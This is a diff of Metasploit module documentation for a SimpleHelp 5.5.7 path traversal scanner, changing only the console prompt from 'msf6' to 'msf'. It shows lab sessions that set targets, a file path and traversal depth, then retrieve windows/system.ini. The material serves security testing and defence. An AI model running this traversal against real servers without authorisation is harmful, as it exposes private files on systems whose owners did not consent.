@@ -34,7 +34,7 @@ Select "Start New Server". The application should now be vulnerable to the path 
 ## Scenarios
 ### SimpleHelp 5.5.7 running on Ubuntu 22.04
 ```
-msf6 exploit(windows/local/cve_2024_35250_ks_driver) > use simplehelp_toolbox_path_traversal
+msf exploit(windows/local/cve_2024_35250_ks_driver) > use simplehelp_toolbox_path_traversal
 
 Matching Modules
 ================
@@ -47,9 +47,9 @@ Matching Modules
 Interact with a module by name or index. For example info 0, use 0 or use auxiliary/scanner/http/simplehelp_toolbox_path_traversal
 
 [*] Using auxiliary/scanner/http/simplehelp_toolbox_path_traversal
-msf6 auxiliary(scanner/http/simplehelp_toolbox_path_traversal) > set rhost 172.16.199.130
+msf auxiliary(scanner/http/simplehelp_toolbox_path_traversal) > set rhost 172.16.199.130
 rhost => 172.16.199.130
-msf6 auxiliary(scanner/http/simplehelp_toolbox_path_traversal) > run
+msf auxiliary(scanner/http/simplehelp_toolbox_path_traversal) > run
 [*] Reloading module...
 [*] Running automatic check ("set AutoCheck false" to disable)
 [+] The target appears to be vulnerable. Version detected: 5.5.7
@@ -61,20 +61,20 @@ msf6 auxiliary(scanner/http/simplehelp_toolbox_path_traversal) > run
 
 ### SimpleHelp 5.5.7 running on Windows 11
 ```
-msf6 auxiliary(scanner/http/simplehelp_toolbox_path_traversal) > set rhosts 172.16.199.131
+msf auxiliary(scanner/http/simplehelp_toolbox_path_traversal) > set rhosts 172.16.199.131
 rhosts => 172.16.199.131
-msf6 auxiliary(scanner/http/simplehelp_toolbox_path_traversal) > set filepath windows/system.ini
+msf auxiliary(scanner/http/simplehelp_toolbox_path_traversal) > set filepath windows/system.ini
 filepath => windows/system.ini
-msf6 auxiliary(scanner/http/simplehelp_toolbox_path_traversal) > set depth 4
+msf auxiliary(scanner/http/simplehelp_toolbox_path_traversal) > set depth 4
 depth => 4
-msf6 auxiliary(scanner/http/simplehelp_toolbox_path_traversal) > run
+msf auxiliary(scanner/http/simplehelp_toolbox_path_traversal) > run
 [*] Running automatic check ("set AutoCheck false" to disable)
 [+] The target appears to be vulnerable. Version detected: 5.5.7
 [+] Downloaded 219 bytes
 [+] File saved in: /Users/jheysel/.msf4/loot/20250221075039_default_172.16.199.131_simplehelp.trave_820456.txt
 [*] Scanned 1 of 1 hosts (100% complete)
 [*] Auxiliary module execution completed
-msf6 auxiliary(scanner/http/simplehelp_toolbox_path_traversal) > cat /Users/jheysel/.msf4/loot/20250221075039_default_172.16.199.131_simplehelp.trave_820456.txt
+msf auxiliary(scanner/http/simplehelp_toolbox_path_traversal) > cat /Users/jheysel/.msf4/loot/20250221075039_default_172.16.199.131_simplehelp.trave_820456.txt
 [*] exec: cat /Users/jheysel/.msf4/loot/20250221075039_default_172.16.199.131_simplehelp.trave_820456.txt
 
 ; for 16-bit app support
